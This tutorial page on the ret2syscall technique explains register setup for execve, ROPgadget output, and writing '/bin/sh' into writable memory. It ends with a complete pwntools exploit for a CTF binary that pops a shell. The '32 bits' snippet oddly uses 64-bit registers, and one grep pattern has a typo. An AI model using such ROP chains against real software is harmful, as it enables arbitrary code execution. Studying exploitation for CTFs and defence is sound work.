## Basic Information

This is similar to Ret2lib, however, in this case we won't be calling a function from a library. In this case, everything will be prepared to call the syscall `sys_execve` with some arguments to execute `/bin/sh`. This technique is usually performed on binaries that are compiled statically, so there might be plenty of gadgets and syscall instructions.

In order to prepare the call for the **syscall** it's needed the following configuration:

- `rax: 59 Specify sys_execve`
- `rdi: ptr to "/bin/sh" specify file to execute`
- `rsi: 0 specify no arguments passed`
- `rdx: 0 specify no environment variables passed`

So, basically it's needed to write the string `/bin/sh` somewhere and then perform the `syscall` (being aware of the padding needed to control the stack). For this, we need a gadget to write `/bin/sh` in a known area.

> [!TIP]
> Another interesting syscall to call is **`mprotect`** which would allow an attacker to **modify the permissions of a page in memory**. This can be combined with [**ret2shellcode**](../../stack-overflow/stack-shellcode/index.html).

## Register gadgets

Let's start by finding **how to control those registers**:

```bash
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```

With these addresses it's possible to **write the content in the stack and load it into the registers**.

## Write string

### Writable memory

First you need to find a writable place in the memory

```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```

### Write String in memory

Then you need to find a way to write arbitrary content in this address

```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```

### Automate ROP chain

The following command creates a full `sys_execve` ROP chain given a static binary when there are write-what-where gadgets and syscall instructions:

```bash
ROPgadget --binary vuln --ropchain
```

#### 32 bits

```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```

#### 64 bits

```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```

## Lacking Gadgets

If you are **lacking gadgets**, for example to write `/bin/sh` in memory, you can use the **SROP technique to control all the register values** (including RIP and params registers) from the stack:

{{#ref}}
../srop-sigreturn-oriented-programming/
{{#endref}}

## Exploit Example

```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
